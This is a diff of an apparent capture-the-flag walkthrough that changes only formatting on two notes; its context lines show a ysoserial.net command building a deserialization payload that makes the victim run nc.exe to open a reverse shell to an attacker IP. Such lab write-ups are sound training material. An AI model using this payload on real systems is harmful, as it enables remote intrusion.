@@ -1005,7 +1005,7 @@ As I have credentials it dawned on me I can most likely invoke a `ps-session` us
     -   {{< figure src="/ox-hugo/2024-10-08-202001_.png" >}}
 
 -   **After some digging I found that** `1.35` **works fine where as** `1.36` **has other deps**:
-    -   ~~Important Note~~: Use Release `1.35` ~~not~~ `1.36`
+    -   +Important Note+: Use Release `1.35` +not+ `1.36`
 
 -   **I generate my payload using** `yoserial.net v1.35`:
     -   `ysoserial-1.35\Release> .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\nc.exe 10.10.14.31 443 -e cmd"`
@@ -1073,7 +1073,7 @@ As I have credentials it dawned on me I can most likely invoke a `ps-session` us
              if __name__ == "__main__":
                  run()
             ```
-    -   ~~NOTE~~: Will output file as `uploaded_file`
+    -   +NOTE+: Will output file as `uploaded_file`
 
 2.  **Send the ticket from victim using** `powershell`:
     ```powershell
